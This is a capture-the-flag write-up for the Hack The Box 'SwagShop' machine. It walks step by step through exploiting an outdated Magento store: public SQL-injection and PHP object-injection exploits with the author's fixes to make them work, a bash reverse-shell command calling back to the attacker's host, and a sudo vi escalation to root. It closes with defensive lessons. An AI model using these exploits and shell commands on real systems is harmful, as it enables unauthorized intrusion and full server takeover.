# SwagShop Writeup w/o Metasploit

![](https://miro.medium.com/max/575/1*6lryATfzCzT-FjPG4gy0Xw.png)

## Reconnaissance <a id="7408"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.140
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* **Port 22:** running OpenSSH 7.2
* **Port 80:** running Apache httpd 2.4.29

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-06 10:42 EST
Nmap scan report for 10.10.10.140
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/6%OT=22%CT=1%CU=34092%PV=Y%DS=2%DC=I%G=Y%TM=5E13556E
....Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.140
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.140
```

This scan took too long to run, so I don’t have UDP scan results for this blog.

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.

## Enumeration <a id="aa73"></a>

I always start off with enumerating HTTP first. Visit the web application.

![](https://miro.medium.com/max/1363/1*YyeRjfqp_ixnCBqAIzoWkw.png)

It’s running Magento, which is an open-source e-commerce platform written in PHP. Considering that it is an off the shelf software, we’ll probably find reported vulnerabilities that are associated to it. But first, we need to get a version number. Notice that at the bottom of the page, it has a copyright detailing the year 2014, which is 6 years ago, so it’s very likely to be vulnerable.

Just like there is a scanner for WordPress applications \(WPScan\), there is one for Magento applications that is called [Mage Scan](https://github.com/steverobbins/magescan). Let’s use it to run a scan on the application.

```text
php magescan.phar -vvv scan:all 10.10.10.140 > output
```

* **-vvv:** increase the verbosity to level 3
* **scan:all:** run all scans

We get back the following result \(truncated\).

```text
Scanning http://10.10.10.140/...Magento Information+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+Installed ModulesNo detectable modules were found.....Unreachable Path Check+-----------------------------------------+---------------+--------+
| Path                                    | Response Code | Status |
+-----------------------------------------+---------------+--------+
| app/etc/local.xml                       | 200           | Fail   |
| index.php/rss/order/NEW/new             | 200           | Fail   |
| shell/                                  | 200           | Fail   |
+-----------------------------------------+---------------+--------+
```

It reports the version number being 1.9.0.0 or 1.9.0.1 and they’re using the Community edition. There are no installed modules, so if we find any public vulnerabilities that are associated to modules, we can discard them. As for the unreachable path check, the last two paths don’t give us anything useful. However, the first path, gives us an xml file that leaks the _swagshop_ mysql database username and password.

```text
<host><![CDATA[localhost]]></host>
<username><![CDATA[root]]></username>
<password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
<dbname><![CDATA[swagshop]]></dbname>
```

This might come in handy later. Next, let’s run searchsploit.

```text
searchsploit magento
```

We get back the following result.

![](https://miro.medium.com/max/1354/1*KWOCERZxwyD517xPF62RQg.png)

The first three exploits don’t match our version, so we’ll ignore them. The next two might be useful. Since Mage Scan didn’t report plugins, we’ll ignore the plugin vulnerabilities. The two after that might be relevant to our version. Lastly, we’ll also ignore the eBay Magento exploits.

We narrowed down our exploits to four possible options: 39838,37811,19793 and 37977. We’ll start off with looking into exploit number 37977 because it doesn’t require authentication and it is an RCE vulnerability.

## Initial Foothold <a id="26dd"></a>

Copy the exploit to our current directory.

```text
searchsploit -m 37977
```

* **-m:** mirror an exploit to the current working directory.

After skimming through the code of the [exploit](https://www.exploit-db.com/exploits/37977), it seems to be chaining several SQL injection vulnerabilities together that eventually create an administrative account on the system with the username/password _forme_/_forme_.

To get the code working on our application, we need to make a few changes:

* Remove all the uncommented comments & explanation \(or you’ll get compilation errors\)
* Change the target variable to [http://10.10.10.140/](http://10.10.10.140/)
* Change the username/password to random/random \(optional\).

Run the exploit.

```text
root@kali:~/Desktop/htb/swagshop# python 37977.py 
DID NOT WORK
```

It didn’t work and it doesn’t give us much of an explanation why. So let’s redirect all the traffic from the script to Burp. To do that, perform the following steps.

* In Burp, visit _Proxy_ &gt; _Options_ &gt; _Proxy Listeners_ &gt; _Add_. In the _Binding_ tab, set the _Bind port_ to _8081_ and and in the _Request Handling_ tab, set the _Redirect to host_ option to _10.10.10.140_ and the **Redirect to Port** option to _80_. Make sure to select the newly added listener once you’re done.
* Go back to the script and change the target to [http://localhost:8081.](http://localhost:8081./)
* In Burp set intercept to be on.

This way all the traffic of the script will go through Burp first. Run the script again and send the request to _Repeater._ In _Repeater,_ execute the request.

![](https://miro.medium.com/max/1432/1*qBRzUVPhreDe72thXGLKOA.png)

As shown in the above image, the script is failing because it’s not finding the URL. Let’s try it in our browser.

```text
http://localhost:8081/admin
```

Doesn’t work. Let’s visit other links in the website and see how the URL changes. If we click on the Hack the Box sticker we get the following link.

```text
http://10.10.10.140/index.php/5-x-hack-the-box-sticker.html
```

It seems to be appending index.php to all the URLs. Let’s add that in our script. So now our target would be:

```text
http://localhost:8081/index.php
```

Run the script again.

```text
root@kali:~/Desktop/htb/swagshop# python 37977.py 
WORKED
Check http://localhost:8081/index.php/admin with creds random:random
```

It worked! Let’s visit the link and log in with our newly added credentials.

![](https://miro.medium.com/max/1413/1*q-OMgYCidMlGoK9L-jWPkg.png)

We’re in! From here we need to somehow get command execution. Recall that in our searchsploit results there was an authenticated RCE exploit. Transfer it to the current working directory.

```text
searchsploit -m 37811
```

After skimming through the code of the [exploit](https://www.exploit-db.com/exploits/37811), it seems to be a [PHP Object Injection](https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/) in the administrator interface that leads to remote code execution.

To get the code working on our application, we need to make a few changes:

* Add the username/password random/random.
* Change the install date to the exact date from /app/etc/local.xml.

```text
username = 'forme'
password = 'forme'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'
```

As per the included instructions, run the script using the following command:

```text
# python3 %s <target> <payload>
python 37811.py  http://10.10.10.140/index.php "whoami"
```

We get a “mechanize.\_form\_controls.ControlNotFoundError”. We run it through Burp like we did previously and we find out that it’s not even logging in with the admin credentials we created.

After spending some time googling the error, I found [a post](https://stackoverflow.com/questions/35226169/clientform-ambiguityerror-more-than-one-control-matching-name) on stackoverflow stating that the issue is that “there is only one form from the code provided and multiple username, passwords fields which is where the Ambiguous error comes from”. Therefore, we need to use and index parameter for selecting the form. Make the following changes to the code.

```text
br.select_form(nr=0)#Comment out the following code
#br.form.new_control('text', 'login[username]', {'value': username})  
#br.form.fixup()
#br['login[username]'] = username
#br['login[password]'] = password#Add the following code
userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwone = br.find_control(name="login[password]", nr=0)
pwone.value = password
```

Let’s run it again. This time we get a different error.

```text
Traceback (most recent call last):
  File "37811.py", line 74, in <module>
    tunnel = tunnel.group(1)
AttributeError: 'NoneType' object has no attribute 'group'
```

Let’s try and figure out what the error means using Burp. The script already contains code that allows you to send a traffic through a proxy.

```text
#uncomment this line
br.set_proxies({"http": "localhost:8080"})
```

In the _HTTP history_ sub tab, we can see that the script is making 5 requests.

![](https://miro.medium.com/max/1399/1*XZuIrXMnpAlOmPGzr3c2xg.png)

The last request it makes before it reaches an error is the following.

![](https://miro.medium.com/max/1420/1*-OZRLXZ3AWML592_-WLooA.png)

Notice that the POST request is setting a period of 7 days \(7d in the URL\), however, that’s generating a response of “No Data Found”.

Now, if we go back to the error, it was generated in line 74.

```text
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1) . #line 74
```

The first line in the above code is the request that we saw in Burp. The second line seems to be doing some kind of regex, looking for the string “ga=” in the response. Then the third line \(line 74\) [does a match on the first parenthesised subgroup of the tunnel parameter](https://stackoverflow.com/questions/14909777/what-does-the-1-in-match-group1-mean). Since it’s finding nothing, we’re getting the ‘NoneType’ error.

Let’s visit that URL in the browser to see what’s going on. In Burp, right click on the request, select _Request in browser_ &gt; _In original session_.

![](https://miro.medium.com/max/1064/1*lgkHV4B2EtEwry7YZ6ayDQ.png)

Then click on the _Copy_ button and try the URL in the browser \(you have to have your browser configured to go through Burp\). We get the following page.

![](https://miro.medium.com/max/962/1*pbbVEt92nfnxx7SN4HZISg.png)

That’s the rendered version of the code we saw in the Response tab of Burp. I tried selecting the range in the drop down menu but that wasn’t sending any requests, so I started manipulating the value in the URL. I tried all the possible values \(24h, 7d, 1m,1y and 2y\), all of them gave me the same response with the exception of the 2y option, I get the following page.

![](https://miro.medium.com/max/693/1*2LRvGzCrMJr0ZQn0XgRJCA.png)

If you view the source code, you’ll find the following URL.

```text
...
<img src="http://10.10.10.140/index.php/admin/dashboard/tunnel/key/7ab75c459aa9aa75aaf35f957579c666/?ga=YTo5OntzOjM6ImNodCI7czoyOiJsYyI7czozOiJjaGYiO3M6Mzk6ImJnLHMsZjRmNGY0fGMsbGcsOTAsZmZmZmZmLDAuMSxlZGVkZWQsMCI7czozOiJjaG0iO3M6MTQ6IkIsZjRkNGIyLDAsMCwwIjtzOjQ6ImNoY28iO3M6NjoiZGI0ODE0IjtzOjM6ImNoZCI7czoyMjoiZTpBQUFBQUFxcUFBQUFBQUFBQUFBQSI7czo0OiJjaHh0IjtzOjM6IngseSI7czo0OiJjaHhsIjtzOjU4OiIwOnx8MDIvMjAxOXx8MDUvMjAxOXx8MDgvMjAxOXx8MTAvMjAxOXx8MTIvMjAxOXwxOnwwfDF8MnwzIjtzOjM6ImNocyI7czo3OiI1ODd4MzAwIjtzOjM6ImNoZyI7czozNToiMTEuMTExMTExMTExMTExLDMzLjMzMzMzMzMzMzMzMywxLDAiO30%253D&h=b47e205efe9e93bcf282877b9609b5b5" alt="chart" title="chart" />
...
```

The url includes the “ga=” regex string that the script was looking but couldn’t find! So if we change the period to “2y” in the script, we should get a working exploit!

```text
request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
```

Run the script again.

```text
root@kali:~/Desktop/htb/swagshop# python 37811.py  http://10.10.10.140/index.php/admin "whoami"www-data
```

We have command execution! Change the payload to include a reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```text
python 37811.py http://10.10.10.140/index.php/admin "bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'"
```

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Run the script.

![](https://miro.medium.com/max/975/1*2wofzyWVAHdEuuJToW6TjA.png)

We have a shell! Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Grab the user.txt flag.

![](https://miro.medium.com/max/820/1*IoY8IqMKCCOP5vIjDrt30g.png)

## Privilege Escalation <a id="bd9a"></a>

To grab the root.txt flag, we need to escalate our privileges to root.

Run the following command to view the list of allowed commands the user can run as root without a password.

```text
www-data@swagshop:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

We’re allowed to run the vi command on any file in /var/www/html/ as root. If you’re not sure if you can escalate privileges with vi, you can simply check on this [website](https://gtfobins.github.io/). Since we’re restricted to a specific path, we’ll have to slightly modify the command.

```text
sudo vi /var/www/html/bla -c ':!/bin/sh'
```

The above command opens up a shell in the “bla” file and since we ran the command with sudo, the shell is running with root privileges!

```text
"/var/www/html/bla" [New File]
id/bin/sh
uid=0(root) gid=0(root) groups=0(root)
```

Grab the root.txt flag.

![](https://miro.medium.com/max/730/1*ieJsOAMG99J_aRv2X8DZ1w.png)

## Lessons Learned <a id="e2c2"></a>

To gain an initial foothold on the box we exploited four vulnerabilities.

1. Broken access control and sensitive information disclosure. The /app/etc/local.xml file is exposed to unauthenticated users. It not only leaked the mySQL password but also the install date which we required in order to get our exploit working. Proper access control should be applied on all sensitive directories and files.
2. Known SQL injection vulnerability that allowed an unauthenticated user to create an admin account. This is because a vulnerable version of the software was used. The administrators should have updated the application once a patch was made available.
3. Known PHP Object Injection that allowed an authenticated user to run arbitrary commands on the host of the application. Again, this was because a vulnerable version of the software was used. The administrators should have updated the application once a patch was made available
4. Security misconfiguration of the www-data user privileges. Why was the web daemon user \(www-data\) allowed to access the directories of a higher privileged user? The administrator should have conformed to the principle of least privilege and the concept of separation of privileges.

To escalate privileges we exploited one vulnerability.

1. Security misconfiguration of the vi binary. A non-root user was given the ability to run vi with root privileges. Since vi has the ability of running a shell, we were able to exploit that to run a shell with root privileges. Again, the administrator should have conformed to the principle of least privilege.

